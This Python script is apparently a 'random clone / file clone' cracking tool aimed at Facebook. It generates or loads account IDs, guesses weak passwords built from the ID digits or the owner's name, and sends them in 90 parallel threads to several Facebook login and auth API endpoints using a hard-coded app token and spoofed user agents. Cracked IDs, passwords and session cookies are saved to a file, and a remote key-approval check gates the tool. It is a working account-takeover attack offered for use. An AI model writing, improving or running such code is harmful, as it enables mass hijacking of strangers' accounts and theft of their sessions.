import os,sys,uuid,random,time,json,re
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO

try:
    import requests,certifi,rich, pycurl 
except:
    os.system("pip install requests certifi rich pycurl")
    import requests,certifi,rich,pycurl

def clr():
   os.system("clear")
   

def rnua():
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    return uaku2
    
    
line="—"*36
logo=""" 
"""
loop=0
oks=[]
cpc=[]
A=["1","01","a","A"]
B=["2","02","b","B"]

def main():
    
    clr()
    print(logo)
    print(line)
    print(" [A] RANDOM CLONE")
    print(" [B] FILE CLONE")
    
    cos=input(" [=] -> ")
    if cos in A:
        renx()
    elif cos in B:
        filex()
    else:
        main()

def renx():
    user=[]
    pase=[]
    clr()
    print(logo)
    print(" Example :/: 0184 +91629 0333 ")
    print(line)
    code=input(" Input Code :/: ")
    print(" Example :/: 2000, 5999, 10000 ")
    print(line)
    limi=int(input(" Input Limit :/: "))
    print(line)
    for i in range(limi):
        heron=str(random.choice(range(1000000,9999999)))
        user.append(heron)
    print(" Example :/: [1-20] ")
    print(line)
    limix=int(input(" Pass Limit :/: "))
    print(line)
    
    for ic in range(limix):
        print(" Example :/: first6, last6, 57273200")
        pas=str(input(" Input Limit :/: "))
        print(line)
        if pas not in pase:
            pase.append(pas)
    
    print(" [A] Method ")
    print(" [B] Method")
    print(" [C] Method ")
    print(line)
    meth=input(" [=!] Choose : ")
    ng=input(" [✓] Do you want to see Cps ? [N/y] : ")
    cpc.append(ng.lower())
    with ThreadPool(max_workers=90) as HE:
        clr()
        print(logo)
        
        tl=str(len(user))
        print(" [=] Total Id : "+tl)
        print(" [=] Used Pass : "+str(len(pase)))
        print(line)
        for xd in user:
            uid=code+xd
            if meth in A:
                HE.submit(renmeth1,uid,pase,tl)
            elif meth in B:
                HE.submit(renmeth2,uid,pase,tl)
            else:
                HE.submit(renmeth3,uid,pase,tl)
    print(line)
    print(" [>] Crack Complete")
    print(" [<] Total OK : "+str(len(oks)))
    print(line)
def renmeth1(uid,pase,tl):
    global oks,loop,cpc
    sys.stdout.write(f'\r\033[1;37m [HERON-M1\033[1;37m] \033[1;37m<[{loop}|{tl}\033[1;37m]> \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pase:
            session=requests.Session()
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get(f'https://m.facebook.com').text
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={
'Host': 'm.facebook.com',
'content-length': '1730',
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': rnua(),
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVo_Z7twFKE',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://m.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://m.facebook.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r [OK-ID] {xd} | {ps} | {coki}")
                open("/sdcard/ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            elif "checkpoint" in res:
                xx=coki.split("1000")[1]
                xd="1000"+xd[:11]
                if "y" in cpc:
                    print(f"\r\r[CP] {xd} | {ps}")
                break 
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(40)




def renmeth2(uid,pase,tl):
    global oks,loop,cpc
    sys.stdout.write(f'\r\033[1;37m [HERON-M2\033[1;37m] \033[1;37m<[{loop}|{tl}\033[1;37m]> \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pase:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            ua_string=""# Your user agent 
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}

            head={
            'User-Agent': ua_string,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            res=requests.post(url1,data=data,headers=head).json()
            if "session_key" in res:
                coki=";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                xd=res["uid"]
                print(f"\r\r [OK-ID] {xd} | {ps} | {coki}")
                open("/sdcard/ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            elif "www.facebook.com" in res:
                if "y" in cpc:
                    print(f"\r\r[CP] {uid} | {ps}")
                break 
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(40)
        

def renmeth3(uid,pase,tl):
    global oks,loop,cpc
    sys.stdout.write(f'\r\033[1;37m [HERON-M3\033[1;37m] \033[1;37m<[{loop}|{tl}\033[1;37m]> \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pase:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            user_agent=""# Your user agent 
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1', 
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'meta_inf_fbmeta': '', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': user_agent, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url="https://api.facebook.com/method/auth.login"
            res=requests.post(url,data=data,headers=head).json()
            
            if "session_key" in res:
                coki=";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                xd=res["uid"]
                print(f"\r\r [OK-ID] {xd} | {ps} | {coki}")
                open("/sdcard/ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            elif "www.facebook.com" in res:
                if "y" in cpc:
                    print(f"\r\r[CP] {uid} | {ps}")
                break 
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(40)
        

def filex():
    password=[]
    clr()
    print(logo)
    print(" Example : [/sdcard/Heron.txt]  ")
    print(line)
    try:
        flx=input(" !# Path : ")
        fl=open(flx,"r").read().splitlines()
    except:
        filex()
    lim=int(input(" Input Pass Limit : "))
    print(line)
    while True:
        print(" Example : first123 firstlast ")
        pas=input(" #> Add  : ")
        password.append(pas)
        print(line)
        if len(password)>= lim:
            break
        else:
            continue 
    
    
    print(" [A] Method ")
    print(" [B] Method")
    print(" [C] Method ")
    print(line)
    meth=input(" #! choose :")
    ng=input(" [✓] Do you want to see Cps ? [N/y] : ")
    cpc.append(ng.lower())
    with ThreadPool(max_workers=40) as HE:
        clr()
        print(logo)
        tl=str(len(fl))
        print(" [=] Total Id : "+tl)
        print(" [=] Used Pass : "+str(len(password)))
        
        print(line)
        
        for xd in fl:
            uid,name=xd.split("|")
            
            HE.submit(file_sub,uid,password,name,meth,fl)
    print(line)
    print(" [>] Crack Complete")
    print(" [<] Total OK : "+str(len(oks)))
    print(line)

def file_sub(uid,pwx,name,meth,file):
    global oks,loop,cpc
    Session=requests.session()
    sys.stdout.write(f'\r\033[1;37m [HERON-M{meth.upper()}\033[1;37m] \033[1;37m<[{loop}|{str(len(file))}\033[1;37m]> \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m\033[0;00m\r');sys.stdout.flush()
    
    try:
        
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        for pw in pwx:
            ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
            
            if meth in A:
                agent=""
            elif meth in B:
                agent=""
            else:
                agent=""
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = Session.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in po:
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r [OK-ID] {uid} | {ps} | {coki}")
                open("/sdcard/ok.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            
            elif "www.facebook.com" in po:
                if "y" in cpc:
                    print(f"\r\r[CP] {uid} | {ps}")
                break 
            else:continue 
        loop+=1
    except:
        
        time.sleep(30)
        
import os
K1=str(os.getuid())
K2=str(os.getgid())
num_key="AC".join(K1+K2).upper()
from io import BytesIO
import pycurl,certifi
def apv():
    url="https://raw.githubusercontent.com/aj4802/AJ/main/Approval.txt"
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8')
    except Exception as e:
        print(e)
        sys.exit("[!!] Internet Error...")
    if num_key in datax:
        main()
    else:
        
        clr()
        print(" [✓] Key Not Approved")
        print(" !! Key - "+num_key)
        os.system("xdg-open https://m.me/CALL.ME.AJ.YOUR.NEXT.CRUSH")
        sys.exit()


apv()







